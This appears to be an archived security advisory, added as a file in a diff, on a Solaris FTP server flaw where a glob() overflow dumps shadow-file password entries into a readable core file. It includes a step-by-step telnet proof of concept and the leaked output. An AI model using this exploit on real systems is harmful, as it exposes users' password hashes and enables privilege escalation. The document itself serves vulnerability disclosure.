@@ -1,0 +1,28 @@
+source: http://www.securityfocus.com/bid/2601/info
+
+Solaris is the variant of the UNIX Operating System distributed by Sun Microsystems. Solaris is designed as a scalable operating system for the Intel x86 and Sun Sparc platforms, and operates on machines varying from desktop to enterprise server.
+
+A problem in the ftp server included with the Solaris Operating System could allow a local user to recover parts of the shadow file, containing encrypted passwords. Due to a previously known problem involving a buffer overflow in glob(), it is possible to cause a buffer overflow in the Solaris ftp server, which will dump parts of the shadow file to core. This can be done with the CWD ~ command, using a non-standard ftp client.
+
+Therefore, a local user could cause a buffer overflow in the ftp server, and upon reading the core file, recover passwords for other local users, potentially gaining elevated privileges.
+
+[root@ /usr/sbin]> telnet localhost 21
+Trying 127.0.0.1...
+Connected to localhost.
+Escape character is '^]'.
+220 sun26 FTP server (SunOS 5.6) ready.
+user warning3
+331 Password required for warning3. <-- a valid username
+pass blahblah <--- a wrong password
+530 Login incorrect.
+CWD ~
+530 Please login with USER and PASS.
+Connection closed by foreign host.
+[root@ /usr/sbin]> ls -l /core
+-rw-r--r-- 1 root root 284304 Apr 16 10:20 /core
+[root@ /usr/sbin]> strings /core|more
+[...snip...]
+lp:NP:6445::::::
+P:64
+eH::::
+uucp:NP:6445::: 
